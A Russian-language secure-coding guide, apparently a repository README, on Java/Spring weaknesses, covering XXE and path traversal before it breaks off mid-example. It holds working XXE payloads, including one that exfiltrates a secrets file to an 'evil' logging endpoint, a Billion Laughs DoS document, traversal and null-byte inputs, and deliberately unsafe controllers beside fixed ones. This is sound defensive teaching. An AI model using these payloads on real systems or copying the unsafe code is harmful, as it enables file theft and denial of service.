# Примеры эксплуатации и устранения CWE в Java

## Запуск:

```shell
```

Данное руководство поможет вам понять причины появления слабостей, их возможное влияние на приложение, а также способы
их предотвращения в web – приложениях, разрабатываемых на языке Java с использованием Spring.

<!-- TOC -->
* [Примеры эксплуатации и устранения CWE в Java](#примеры-эксплуатации-и-устранения-cwe-в-java)
  * [Запуск:](#запуск)
  * [1. CWE-611: Improper Restriction of XML External Entity Reference](#1-cwe-611-improper-restriction-of-xml-external-entity-reference)
    * [1.1. Описание](#11-описание)
      * [1.1.1. XInclude](#111-xinclude)
    * [1.2. Защитные меры](#12-защитные-меры)
    * [1.3. Примеры](#13-примеры)
      * [*Пример 1. Небезопасный анмаршаллинг объекта из XML документа*](#пример-1-небезопасный-анмаршаллинг-объекта-из-xml-документа)
      * [*Пример 2. Безопасный анмаршаллинг объекта из XML документа*](#пример-2-безопасный-анмаршаллинг-объекта-из-xml-документа)
      * [*Пример 3. Безопасный парсинг при помощи javax.xml.parsers.DocumentBuilder*](#пример-3-безопасный-парсинг-при-помощи-javaxxmlparsersdocumentbuilder)
      * [*Пример 4. Безопасный парсинг при помощи org.dom4j.io.SAXReader*](#пример-4-безопасный-парсинг-при-помощи-orgdom4jiosaxreader)
  * [2. CWE-73: External Control of File Name or Path](#2-cwe-73-external-control-of-file-name-or-path)
    * [2.1. Описание](#21-описание)
      * ["Null Byte Injection" или "Null Byte Poisoning"](#null-byte-injection-или-null-byte-poisoning)
    * [2.2. Защитные меры](#22-защитные-меры)
    * [2.3. Примеры](#23-примеры)
      * [*Пример 1. Небезопасное составление имени файла*](#пример-1-небезопасное-составление-имени-файла)
      * [*Пример 2. Небезопасное составление имени файла*](#пример-2-небезопасное-составление-имени-файла)
      * [*Пример 3. Небезопасное составление имени файла*](#пример-3-небезопасное-составление-имени-файла)
      * [*Пример 4. Безопасное составление имени файла: нормализация и проверка результирующей директории*](#пример-4-безопасное-составление-имени-файла-нормализация-и-проверка-результирующей-директории)
      * [*Пример 5. Безопасное составление имени файла: нормализация и проверка результирующей директории*](#пример-5-безопасное-составление-имени-файла-нормализация-и-проверка-результирующей-директории)
      * [*Пример 6. Безопасное составление имени файла: проверка regex и очистка от «..»*](#пример-6-безопасное-составление-имени-файла-проверка-regex-и-очистка-от-)
  * [3. CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')](#3-cwe-89-improper-neutralization-of-special-elements-used-in-an-sql-command-sql-injection)
    * [3.1. Описание](#31-описание)
    * [3.2. Защитные меры](#32-защитные-меры)
      * [3.2.1. Использование Prepared Statements](#321-использование-prepared-statements)
      * [*Пример небезопасного использования класса Statement*](#пример-небезопасного-использования-класса-statement)
      * [*Пример безопасного использования класса PreparedStatement*](#пример-безопасного-использования-класса-preparedstatement)
      * [3.2.2. Использование хранимых процедур](#322-использование-хранимых-процедур)
      * [3.2.3. Проверка ввода по белому списку](#323-проверка-ввода-по-белому-списку)
      * [3.2.4. Экранирование всех вводимых пользователем данных](#324-экранирование-всех-вводимых-пользователем-данных)
      * [*Пример использования ESAPI:*](#пример-использования-esapi)
    * [3.3. Java Persistence API и Hibernate. HQL injection и JPQL injection](#33-java-persistence-api-и-hibernate-hql-injection-и-jpql-injection)
    * [3.4. Примеры](#34-примеры)
      * [*Пример 1. Небезопасное использование Hibernate Query Language (HQL)*](#пример-1-небезопасное-использование-hibernate-query-language-hql)
      * [*Пример 2. Небезопасное использование HQL*](#пример-2-небезопасное-использование-hql)
      * [*Пример 3. Небезопасное использование HQL*](#пример-3-небезопасное-использование-hql)
      * [*Пример 4. Безопасное использование HQL*](#пример-4-безопасное-использование-hql)
      * [*Пример 5. Безопасное использование HQL*](#пример-5-безопасное-использование-hql)
      * [*Пример 6. Безопасное использование Java Persistence Query Language (JPQL)*](#пример-6-безопасное-использование-java-persistence-query-language-jpql)
      * [*Пример 7. Безопасное использование Java Persistence Query Language (JPQL)*](#пример-7-безопасное-использование-java-persistence-query-language-jpql)
      * [*Пример 8. Безопасное использование Java Persistence Query Language (JPQL)*](#пример-8-безопасное-использование-java-persistence-query-language-jpql)
      * [*Пример 9. Безопасное использование JPA Criteria API*](#пример-9-безопасное-использование-jpa-criteria-api)
      * [*Пример 10. Небезопасное использование MyBatis*](#пример-10-небезопасное-использование-mybatis)
      * [*Пример 11. Безопасное использование MyBatis*](#пример-11-безопасное-использование-mybatis)
      * [*Пример 12. Небезопасное использование JPQL*](#пример-12-небезопасное-использование-jpql)
      * [*Пример 13. Корректное использование – белый список*](#пример-13-корректное-использование--белый-список)
    * [3.5. В заключении](#35-в-заключении)
    * [3.6. Дополнительная литература](#36-дополнительная-литература)
  * [4. CWE-94: Improper Control of Generation of Code ('Code Injection')](#4-cwe-94-improper-control-of-generation-of-code-code-injection)
    * [4.1. Class.forName](#41-classforname)
    * [4.2. logger.*](#42-logger)
    * [*Пример эксплуатации уязвимости Log4Shell:*](#пример-эксплуатации-уязвимости-log4shell)
      * [4.2.1. Условия для появления уязвимости:](#421-условия-для-появления-уязвимости)
    * [4.3. Защитные меры](#43-защитные-меры)
    * [4.4. Дополнительная литература](#44-дополнительная-литература)
  * [5. CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection')](#5-cwe-77-improper-neutralization-of-special-elements-used-in-a-command-command-injection)
    * [5.1. Описание](#51-описание)
    * [5.2. Потенциальное воздействие](#52-потенциальное-воздействие)
    * [5.3. Защитные меры](#53-защитные-меры)
      * [5.3.1. Стандартные библиотеки и функции Java](#531-стандартные-библиотеки-и-функции-java)
      * [5.3.2. ProcessBuilder](#532-processbuilder)
      * [*Пример 1. Некорректное использование*](#пример-1-некорректное-использование)
      * [*Пример 2. Корректное использование*](#пример-2-корректное-использование)
      * [*Пример 3. Корректное использование*](#пример-3-корректное-использование)
      * [5.3.3. Input validation](#533-input-validation)
    * [5.4. В заключении](#54-в-заключении)
  * [6. CWE-918: Server-Side Request Forgery (SSRF)](#6-cwe-918-server-side-request-forgery-ssrf)
    * [6.1. Описание](#61-описание)
    * [6.2. Защитные меры](#62-защитные-меры)
    * [6.3. Примеры](#63-примеры)
      * [*Пример 1. Некорректное использование*](#пример-1-некорректное-использование-1)
      * [*Пример 2. Некорректное использование*](#пример-2-некорректное-использование)
      * [*Пример 3. Корректное, но не рекомендуемое использование*](#пример-3-корректное-но-не-рекомендуемое-использование)
      * [*Пример 4. Корректное использование – белый список*](#пример-4-корректное-использование--белый-список)
      * [*Пример 5. Некорректное использование*](#пример-5-некорректное-использование)
      * [*Пример 6. Корректное, но не рекомендуемое использование*](#пример-6-корректное-но-не-рекомендуемое-использование)
      * [*Пример 7. Корректное использование – белый список*](#пример-7-корректное-использование--белый-список)
    * [6.4. Дополнительная литература](#64-дополнительная-литература)
  * [7. CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')](#7-cwe-79-improper-neutralization-of-input-during-web-page-generation-cross-site-scripting)
* [TODO!](#todo)
  * [8. CWE-643: Improper Neutralization of Data within XPath Expressions ('XPath Injection')](#8-cwe-643-improper-neutralization-of-data-within-xpath-expressions-xpath-injection)
    * [8.1. Описание](#81-описание)
    * [8.2. Защитные меры](#82-защитные-меры)
    * [8.3. Примеры](#83-примеры)
      * [*Пример 1. Некорректное использование*](#пример-1-некорректное-использование-2)
      * [*Пример 2. Корректное, но не рекомендуемое использование*](#пример-2-корректное-но-не-рекомендуемое-использование)
      * [*Пример 3. Корректное использование – параметризация запроса*](#пример-3-корректное-использование--параметризация-запроса)
      * [*Пример 4. Корректное использование – параметризация запроса с помощью javax.xml.xquery.XQPreparedExpression*](#пример-4-корректное-использование--параметризация-запроса-с-помощью-javaxxmlxqueryxqpreparedexpression)
    * [8.4. Дополнительная литература](#84-дополнительная-литература)
  * [9. CWE-652: Improper Neutralization of Data within XQuery Expressions ('XQuery Injection')](#9-cwe-652-improper-neutralization-of-data-within-xquery-expressions-xquery-injection)
    * [9.1. Описание](#91-описание)
    * [9.2. Защитные меры](#92-защитные-меры)
    * [9.3. Примеры](#93-примеры)
      * [*Пример 1. Некорректное использование*](#пример-1-некорректное-использование-3)
      * [*Пример 2. Корректное использование – параметризация запроса*](#пример-2-корректное-использование--параметризация-запроса)
      * [*Пример 3. Корректное использование – параметризация запроса*](#пример-3-корректное-использование--параметризация-запроса-1)
    * [9.4. Дополнительная литература](#94-дополнительная-литература)
  * [10. CWE-91: XML Injection (aka Blind XPath Injection)](#10-cwe-91-xml-injection-aka-blind-xpath-injection)
    * [10.1. Описание](#101-описание)
    * [10.2. Защитные меры](#102-защитные-меры)
    * [10.3. Примеры](#103-примеры)
      * [*Пример 1. Небезопасная запись в XML документ*](#пример-1-небезопасная-запись-в-xml-документ)
      * [*Пример 2. Безопасное добавление пользователя в XML документ при помощи javax.xml.bind.Marshaller*](#пример-2-безопасное-добавление-пользователя-в-xml-документ-при-помощи-javaxxmlbindmarshaller)
      * [*Пример 3. Безопасное экранирование пользовательского ввода*](#пример-3-безопасное-экранирование-пользовательского-ввода)
    * [10.4. Дополнительная литература](#104-дополнительная-литература)
  * [11.	CWE-209: Generation of Error Message Containing Sensitive Information](#11-cwe-209-generation-of-error-message-containing-sensitive-information)
    * [11.1. Описание](#111-описание)
    * [11.2. Защитные меры](#112-защитные-меры)
    * [11.3. Примеры](#113-примеры)
      * [*Пример 1. Отсутствие обработки сообщений об ошибках*](#пример-1-отсутствие-обработки-сообщений-об-ошибках)
      * [*Пример 2. Небезопасная генерация сообщений об ошибках*](#пример-2-небезопасная-генерация-сообщений-об-ошибках)
      * [*Пример 2. Безопасная генерация сообщений об ошибках*](#пример-2-безопасная-генерация-сообщений-об-ошибках)
    * [11.4. Дополнительная литература](#114-дополнительная-литература)
  * [Приложение 1. Структура и возможности XML](#приложение-1-структура-и-возможности-xml)
    * [1.1. Разница между XML и HTML](#11-разница-между-xml-и-html)
    * [1.2. Структура XML](#12-структура-xml)
    * [1.3. XML схема](#13-xml-схема)
    * [1.4. Преобразования](#14-преобразования)
    * [1.5. Объектная модель  XML-документов (Document Object Model - DOM)](#15-объектная-модель--xml-документов-document-object-model---dom)
    * [1.6. XPath](#16-xpath)
    * [1.7. XQuery](#17-xquery)
<!-- TOC -->

## 1. CWE-611: Improper Restriction of XML External Entity Reference

![cwe-611_1.png](readme_img/cwe-611_1.png)

### 1.1. Описание

Атака типа внедрение XML eXternal Entity (XXE) находится на 4 месте в топ-10 OWASP и представляет собой тип атаки на
приложение, которое анализирует XML.  
Эта атака происходит, когда ненадежный XML, содержащий ссылку на внешний объект, обрабатывается плохо настроенным
синтаксическим анализатором XML.  
Атака может привести к раскрытию конфиденциальных данных, отказу в обслуживании, подделке запросов на стороне сервера (SSRF), сканированию портов с точки зрения машины, на которой расположен анализатор, и другим системным воздействиям.  
Подробнее о типах атак можно прочитать на https://github.com/HackTricks-wiki/hacktricks/blob/master/pentesting-web/xxe-xee-xml-external-entity.md  
Типы сценариев XXE (различные типы сценариев, с которыми вы можете столкнуться):

- XXE на основе ответа - когда внедренный запрос выдает данные в ответ.
- XXE на основе ошибок - когда нет ответа от объектов XML, но мы можем просмотреть ответ, вызвав ошибки.
- Слепой XXE - когда нет ни ошибки, ни ответа, но XML анализируется на стороне сервера.

Пример: программа парсит XML – файл и возвращает результат пользователю. Создадим XML и добавим туда внешнюю сущность `<!
ENTITY xxe SYSTEM "file:///c:/temp/secrets.txt" >` (URI, указывающий на локальный файл):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE user [
        <!ENTITY xxe SYSTEM "file:///c:/temp/secrets.txt" >
        ]>
<user id="ec77d4a3-156a-4464-bc9e-ed9835661b75">
    <username>&xxe;</username>
    <password>7815696ecbf1c96e6894b779456d330e</password>
    <group>Users</group>
    <email>zx</email>
</user>
```

При парсинге XML с помощью популярных Java – парсеров, содержимое (строка «XXE injection example») файла
`c:/temp/secrets.txt` подставляется внутрь тэга username:

![cwe-611_2.png](readme_img/cwe-611_2.png)

XML – парсер может получить доступ к любому файлу на сервере, если к этому файлу имеет доступ учетная запись, от имени
которой запущено приложение.  
Пример использования внешней сущности для слепого извлечения файлов путем перенаправления вывода на контролируемый
сервер:
XML – документ:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % pe SYSTEM "http://localhost:7171/evil/xxe-file"> %pe; %param1; ]>
<foo>&external;</foo>
```

Содержимое файла xxe_file:

```xml
<!ENTITY % payload SYSTEM "file:///c:/temp/secrets.txt">
<!ENTITY % param1 "<!ENTITY external SYSTEM 'http://localhost:7171/evil/log-data?data=%payload;'>">
```

Лог на сервере злоумышленника:

![cwe-611_3.png](readme_img/cwe-611_3.png)

Самый безопасный способ предотвратить появление XXE - это всегда полностью отключать поддержку DTD и внешних сущностей.  
Отключение поддержки DTD и внешних сущностей также обеспечивает защиту парсера от атак типа "отказ в обслуживании" (DOS), таких, как Billion Laughs:

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
        <!ENTITY lol "lol">
        <!ELEMENT lolz (#PCDATA)>
        <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
        <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
        <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
        <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
        <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
        <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
        <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
        <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
        <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
        ]>
<lolz>&lol9;</lolz>
```

\* некоторые современные XML – парсеры содержат защиту от данного вида атаки по умолчанию. Например, в
`org.w3c.dom.Document` ограничение на количество сущностей – 64 000. Но даже с таким ограничением возможно сформировать
XML документ размером более 40 МБ, чего достаточно для проведения атаки типа DDoS в случае одновременной отправки
большого количества запросов:

![cwe-611_4.png](readme_img/cwe-611_4.png)

#### 1.1.1. XInclude

Некоторые приложения получают данные, переданные клиентом, вставляют их на стороне сервера в XML-документ, а затем
разбирают этот документ. Примером может служить ситуация, когда переданные клиентом данные помещаются во внутренний
SOAP-запрос, который затем обрабатывается внутренним SOAP-сервисом.  
В этой ситуации вы не сможете провести классическую XXE-атаку, потому что вы не контролируете весь XML-документ и
поэтому не можете определить или изменить элемент DOCTYPE. Однако вместо этого вы можете использовать XInclude.
XInclude - это часть спецификации XML, которая позволяет создавать XML-документ из поддокументов. Вы можете поместить
XInclude в любое значение данных в XML-документе, поэтому атака может быть выполнена в ситуациях, когда вы контролируете
только один элемент данных, помещенный в XML-документ на стороне сервера.  
Чтобы выполнить атаку XInclude, нужно обратиться к пространству имен XInclude и указать путь к файлу, который вы хотите
включить. Например:

```xml

<foo xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include parse="text" href="jar:file:///c:/temp/secrets.zip!/secrets.txt"/>
</foo>
```

### 1.2. Защитные меры

Единственным надежным способом предотвращения XXE является отключение поддержки DTD и внешних сущностей при обработке
XML документа.
Для классов DocumentBuilderFactory, SAXParserFactory, XMLInputFactory (StAX parser) и других, отключение поддержки DTD и
внешних сущностей осуществляется с помощью метода setFeature, например:

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
// This is the PRIMARY defense. If DTDs (doctypes) are disallowed, almost all
// XML entity attacks are prevented
// Xerces 2 only - http://xerces.apache.org/xerces2-j/features.html#disallow-doctype-decl
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
// and these as well, per Timothy Morgan's 2014 paper: "XML Schema, DTD, and Entity Attacks"
dbf.setXIncludeAware(false);
```

```java
SAXParserFactory factory = SAXParserFactory.newInstance();
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl",true);
```

```java
XMLInputFactory xmlInputFactory = XMLInputFactory.newInstance();
xmlInputFactory.setProperty("javax.xml.stream.isSupportingExternalEntities", false);
```

Данному виду атаки подвержены многие классы Java, а также некоторые версии Spring OXM и Spring MVC:

- JAXP DocumentBuilderFactory, SAXParserFactory and DOM4J
- XMLInputFactory (a StAX parser)
- Oracle DOM Parser
- TransformerFactory
- Validator
- SchemaFactory
- SAXTransformerFactory
- XMLReader
- SAXReader
- SAXBuilder
- No-op EntityResolver
- JAXB Unmarshaller
- XPathExpression
- java.beans.XMLDecoder

Для снижения вероятности реализации CWE-611 следуйте следующим рекомендациям:

1. Старайтесь всегда полностью отключать поддержку DTD, внешних сущностей и XInclude;
2. Не доверяйте XML, полученным из внешних источников и данным, вводимым пользователем;
3. Проверяйте вводимые пользователем данные. Отклоняйте данные, /фильтруйте/избегайте, если возможно.

Примеры корректного отключения поддержки DTD и внешних сущностей для различных XML парсеров представлены на
странице https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html

### 1.3. Примеры

#### *Пример 1. Небезопасный анмаршаллинг объекта из XML документа*

```java
@PostMapping(value = "unmarshall-full-unsafe",
        consumes = MediaType.APPLICATION_XML_VALUE, produces = MediaType.TEXT_PLAIN_VALUE)
@ResponseStatus(HttpStatus.CREATED)
public void xxeFileUnmarshallUnsafe(@RequestBody String xml, HttpServletResponse response) throws JAXBException, IOException {
    // Необходимо только для демонстрации <!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts" >
    // с сущностями типа "lol" работает по умолчанию
    System.setProperty("javax.xml.accessExternalDTD", "all");

    User user = JAXB.unmarshal(new StringReader(xml), User.class);
    response.getWriter().write(user.toString());
}
```

![cwe-611_5.png](readme_img/cwe-611_5.png)

#### *Пример 2. Безопасный анмаршаллинг объекта из XML документа*

В данном примере отключена поддержка DTD до начала процесса парсинга XML. При попытке эксплуатации XXE injection, на
сервере выбрасывается исключение org.xml.sax.SAXParseException: DOCTYPE is disallowed when the
feature "http://apache.org/xml/features/disallow-doctype-decl" set to true. А пользователю – ошибка 500 Internal Server
Error.
```java
@PostMapping(value = "unmarshall-safe",
        consumes = MediaType.APPLICATION_XML_VALUE, produces = MediaType.TEXT_PLAIN_VALUE)
@ResponseStatus(HttpStatus.CREATED)
public void unmarshallSafe(@RequestBody String xml, HttpServletResponse response) throws IOException, SAXException, ParserConfigurationException {
    // Because javax.xml.bind.Unmarshaller parses XML but does not support any flags for disabling XXE, you must
    // parse the untrusted XML through a configurable secure parser first, generate a source object as a result,
    // and pass the source object to the Unmarshaller. For example:

    SAXParserFactory spf = SAXParserFactory.newInstance();

    //Option 1: This is the PRIMARY defense against XXE
    spf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
    spf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
    spf.setXIncludeAware(false);

    //Do unmarshall operation
    Source xmlSource = new SAXSource(spf.newSAXParser().getXMLReader(),
            new InputSource(new StringReader(xml)));
    User user = JAXB.unmarshal(xmlSource, User.class);
    response.getWriter().write(user.toString());
}
```

#### *Пример 3. Безопасный парсинг при помощи javax.xml.parsers.DocumentBuilder*
```java

@PostMapping(value = "domparse-safe",
        consumes = MediaType.APPLICATION_XML_VALUE, produces = MediaType.TEXT_PLAIN_VALUE)
@ResponseStatus(HttpStatus.CREATED)
public void domParseSafe(@RequestBody String xml, HttpServletResponse response) throws ParserConfigurationException, IOException, SAXException {
    Users users = new Users();
    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();

    // This is the PRIMARY defense. If DTDs (doctypes) are disallowed, almost all
    // XML entity attacks are prevented
    // Xerces 2 only - http://xerces.apache.org/xerces2-j/features.html#disallow-doctype-decl
    dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
    // and these as well, per Timothy Morgan's 2014 paper: "XML Schema, DTD, and Entity Attacks"
    dbf.setXIncludeAware(false);

    DocumentBuilder builder = dbf.newDocumentBuilder();
    Document document = builder.parse(new InputSource(new StringReader(xml)));
    document.getDocumentElement().normalize();
    NodeList nodeList = document.getElementsByTagName("user");
    for (int i = 0; i < nodeList.getLength(); i++) {
        Node node = nodeList.item(i);
        if (node.getNodeType() == Node.ELEMENT_NODE) {
            Element element = (Element) node;
            User user = new User(
                    element.getElementsByTagName("username").item(0).getTextContent(),
                    element.getElementsByTagName("password").item(0).getTextContent(),
                    element.getElementsByTagName("group").item(0).getTextContent(),
                    UUID.fromString(element.getAttribute("id")),
                    element.getElementsByTagName("email").item(0).getTextContent());
            users.addUser(user);
        }
    }
    response.getWriter().write(users.toString());
}
```

#### *Пример 4. Безопасный парсинг при помощи org.dom4j.io.SAXReader*
```java

@PostMapping(value = "saxparse-safe",
        consumes = MediaType.APPLICATION_XML_VALUE, produces = MediaType.TEXT_PLAIN_VALUE)
@ResponseStatus(HttpStatus.CREATED)
public void saxParseSafe(@RequestBody String xml, HttpServletResponse response) throws ParserConfigurationException, IOException, SAXException, DocumentException {
    // To protect a Java org.dom4j.io.SAXReader from an XXE attack, do this:
    SAXReader saxReader = new SAXReader();
    saxReader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
    saxReader.setFeature("http://xml.org/sax/features/external-general-entities", false);
    saxReader.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

    org.dom4j.Document document = saxReader.read(new InputSource(new StringReader(xml)));
    response.getWriter().write(document.asXML());
}
```

***

## 2. CWE-73: External Control of File Name or Path

### 2.1. Описание

![cwe-73_1.png](readme_img/cwe-73_1.png)

Данная слабость возникает в случае, если приложение позволяет пользовательскому вводу контролировать или влиять на пути
или имена файлов, используемые в операциях с файловой системой. Это может позволить злоумышленнику получить доступ или
изменить системные файлы или другие файлы, критичные для приложения.  
Одним из примеров атаки с использованием данной слабости является Path Traversal.  
Как правило, такие атаки предполагают использование dot-dot-slash ((`..\` или `../`)) последовательностей (relative path
traversal) или абсолютных путей вместо относительных (absolute path traversal). Для защиты необходимо применять
различные способы валидации данных, получаемых от пользователя. Как правило, path traversal атаки, известные также как
directory traversal, позволяют злоумышленнику работать с файлами и папками, к которым в обычном случае у него не должно
быть доступа.  
Например, возьмем контроллер для скачивания изображений. Путь к файлу формируется при помощи конкатенации "c:\temp\" и
имени файла, поступившего из GET-запроса:

```java
static final String BASE_DIRECTORY = "c:\\temp\\";

@GetMapping("download-image-unsafe")
public void downloadImageUnsafe(@RequestParam("filename") String fileName, HttpServletResponse response) throws IOException {

    File f = new File(BASE_DIRECTORY + fileName);

    if (f.exists() && !f.isDirectory()) {

        MediaType mediaType = MediaTypeFactory.getMediaType(fileName)
                .orElse(MediaType.APPLICATION_OCTET_STREAM);

        response.setContentType(mediaType.toString());
        response.setHeader("Content-Disposition", "attachment; filename=" + f.getName());

        response.getOutputStream()
                .write(("Resolved file name: " + f + "\n" + "Canonical pathname: "
                        + f.getCanonicalPath() + "\n\n").getBytes());
        response.getOutputStream().write(Files.readAllBytes(f.toPath()));
    } else {
        response.setStatus(HttpServletResponse.SC_NOT_FOUND);
        response.getWriter().write("File doesn't exist or is not a file.");
    }
}
```

Передав в качестве параметра `filename=/../windows/system32/drivers/etc/hosts` мы смогли выйти за пределы
каталога `c:\temp\`, поднявшись сначала на уровень выше, а потом попали в каталог `C:\Windows\System32\drivers\etc\` и
скачали файл `hosts`:

![cwe-73_2.png](readme_img/cwe-73_2.png)

Влияние от атаки можно значительно уменьшить, если после пользовательского ввода добавлять некоторый текст, например:

```java
File picture = new File(BASE_DIRECTORY + fileName + ".jpeg");
```

Или проверив имя переданного в GET-запросе параметра:

```java
if(fileName.endsWith(".jpg")){
File picture = new File(fileName);
}
```

В таком случае за пределы каталога все равно можно выйти, но прочитать получится только файл с расширением jpg.

#### "Null Byte Injection" или "Null Byte Poisoning"

> Важно:
> Данный способ «смягчения» последствий крайне не рекомендуется использовать в качестве основной защиты от атаки типа
> path traversal, т.к. в старых версиях Java возможна инъекция Null Byte:  
> Инъекция нулевого байта - это активная техника эксплуатации, используемая для обхода фильтров проверки целостности
> веб-инфраструктуры путем добавления в пользовательские данные символов нулевого байта, закодированных в URL (т.е. %00
> или 0x00 в шестнадцатеричном формате). Нулевой байт представляет собой точку окончания строки или символ-разделитель,
> который означает немедленное прекращение обработки строки. Байты, следующие за разделителем, игнорируются. Такая
> инъекция может изменить логику работы приложения и позволить злоумышленнику получить несанкционированный доступ к
> системным файлам.  
> Например, проверку расширения файла можно обойти, используя ввод вида `secret.txt%00.jpg`  
> Инъекция нулевого байта в именах файлов была исправлена в Java начиная с версии jdk 7u40 b28
> Подробнее:
>
> http://projects.webappsec.org/w/page/13246949/Null-Byte-Injection
>
> https://portswigger.net/blog/null-byte-attacks-are-alive-and-well
>
> https://bugs.java.com/bugdatabase/view_bug.do?bug_id=8014846

### 2.2. Защитные меры

Для предотвращения CWE-73 необходимо выполнять следующие рекомендации:

1. Избегайте использования пользовательского ввода непосредственно в функциях, работающих с файлами;
2. Выполняйте очистку и фильтрацию пользовательского ввода;
3. Проверяйте результирующий путь перед выполнением операций чтения и записи;
4. Для загрузки ресурсов используйте загрузчик класса, который может загружать файлы только из Classpath,
   например, `Class.getClassLoader().getResource()`, `Class.getResource()`,
   или `org.springframework.core.io.ResourceLoader`.

### 2.3. Примеры

#### *Пример 1. Небезопасное составление имени файла*

Путь к файлу формируется при помощи конкатенации `c:\temp\` и имени файла, поступившего из GET-запроса.

```java
static final String BASE_DIRECTORY = "c:\\temp\\";

@GetMapping("download-image-unsafe")
public void downloadImageUnsafe(@RequestParam("filename") String fileName, HttpServletResponse response) throws IOException {

    File f = new File(BASE_DIRECTORY + fileName);

    if (f.exists() && !f.isDirectory()) {

        MediaType mediaType = MediaTypeFactory.getMediaType(fileName)
                .orElse(MediaType.APPLICATION_OCTET_STREAM);

        response.setContentType(mediaType.toString());
        response.setHeader("Content-Disposition", "attachment; filename=" + f.getName());

        response.getOutputStream()
                .write(("Resolved file name: " + f + "\n" + "Canonical pathname: "
                        + f.getCanonicalPath() + "\n\n").getBytes());
        response.getOutputStream().write(Files.readAllBytes(f.toPath()));
    } else {
        response.setStatus(HttpServletResponse.SC_NOT_FOUND);
        response.getWriter().write("File doesn't exist or is not a file.");
    }
}
```

#### *Пример 2. Небезопасное составление имени файла*

Путь к сохраняемому файлу формируется при помощи конкатенации пути к папке temp и имени
файла (`file.getOriginalFilename()`), поступившего в POST-запросе.

```java

@PostMapping("upload-image-unsafe")
public ResponseEntity<?> uploadImageUnsafe(@RequestParam("file") MultipartFile file) {
    if (file == null) return ResponseEntity.status(HttpStatus.I_AM_A_TEAPOT).body("File missing");
    try {
        String requestFileName = file.getOriginalFilename();
        File resultFile = new File(System.getProperty("java.io.tmpdir") + requestFileName);

        file.transferTo(resultFile);

        String result = String.format("%s\tFile with requestFileName %s transferred to %s (resultPath: %s)"
                , new Date(), requestFileName, resultFile, resultFile.getCanonicalPath());

        return ResponseEntity.ok().body(result);
    } catch (IOException e) {
        e.printStackTrace();
        return ResponseEntity.internalServerError().body(e.getMessage());
    }
}
```

Сформировав POST запрос вручную, можно подделать название файла, чтобы сохранить его в любое доступное для записи место:

![cwe-73_3.png](readme_img/cwe-73_3.png)

#### *Пример 3. Небезопасное составление имени файла*

```java

@PostMapping("upload")
public XsdResponse upload(@RequestParam("file") MultipartFile file,
                          RedirectAttributes redirectAttributes) {

    File copied = new File(System.getProperty("java.io.tmpdir") + "/" + file.getOriginalFilename());
    XsdResponse response;

    try {
        FileUtils.copyInputStreamToFile(file.getInputStream(), copied);
```

#### *Пример 4. Безопасное составление имени файла: нормализация и проверка результирующей директории*

```java
public static final String BASE_DIRECTORY = "/var/www/images/";

public void downloadFile(String fileName) throws IOException {

    File file = new File(BASE_DIRECTORY, fileName);
    if (file.getCanonicalPath().startsWith(BASE_DIRECTORY)) {
        // process file
        doSomething();
    } else
        throw new RuntimeException(String.format("Не валидное имя файла. %s", fileName));
}
```

#### *Пример 5. Безопасное составление имени файла: нормализация и проверка результирующей директории*

```java
static final String BASE_DIRECTORY = "c:\\temp\\";

@GetMapping("download-image-safe")
public void downloadImageSafe(@RequestParam("filename") String fileName, HttpServletResponse response) throws IOException {

    File f = new File(BASE_DIRECTORY + fileName);

    if (!f.getCanonicalPath().toLowerCase().startsWith(BASE_DIRECTORY)
            || (!f.exists() && f.isDirectory())) {
        response.setStatus(HttpServletResponse.SC_NOT_FOUND);
        response.getWriter().write("File doesn't exist or is not a file.");
    } else {
        MediaType mediaType = MediaTypeFactory.getMediaType(fileName)
                .orElse(MediaType.APPLICATION_OCTET_STREAM);
        response.setContentType(mediaType.toString());
        response.setHeader("Content-Disposition", "attachment; filename=" + f.getName());
        response.getOutputStream()
                .write(("Resolved file name: " + f + "\n" + "Canonical pathname: "
                        + f.getCanonicalPath() + "\n\n").getBytes());
        response.getOutputStream().write(Files.readAllBytes(f.toPath()));
    }
}
```

#### *Пример 6. Безопасное составление имени файла: проверка regex и очистка от «..»*

```java
static boolean checkFileName(final String fileName) {
    final String pattern = "^[A-Za-z0-9.\\-\\_]{1,255}$";
    return fileName.matches(pattern);
}

@PostMapping("upload")
public XsdResponse upload(@RequestParam("file") MultipartFile file, RedirectAttributes redirectAttributes) {
    String fileName = file.getOriginalFilename();
    if (fileName == null) {
        throw new RuntimeException(String.format("Отсутсвует имя файла."));
    }
